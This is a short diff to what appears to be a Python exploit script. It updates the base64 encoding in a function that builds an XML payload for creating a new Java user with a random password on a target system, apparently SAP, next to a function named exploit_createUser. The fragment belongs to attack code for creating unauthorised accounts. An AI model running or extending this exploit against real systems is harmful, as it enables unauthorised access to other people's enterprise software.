@@ -75,7 +75,7 @@ def generate_CreateUser_paylod():
     password = "Secure!PwD%d" % (random.randint(5000, 10000))
     p = "<root><user><JavaOrABAP>java</JavaOrABAP><username>%s</username><password>%s</password><userType>J</userType></user></root>" % (username, password)
     print("Going to create new user. %s:%s" % (username, password))
-    return base64.b64encode(p)
+    return base64.b64encode(p.encode('utf-8')).decode('utf-8')
 
 def exploit_createUser(url):
     headers = {
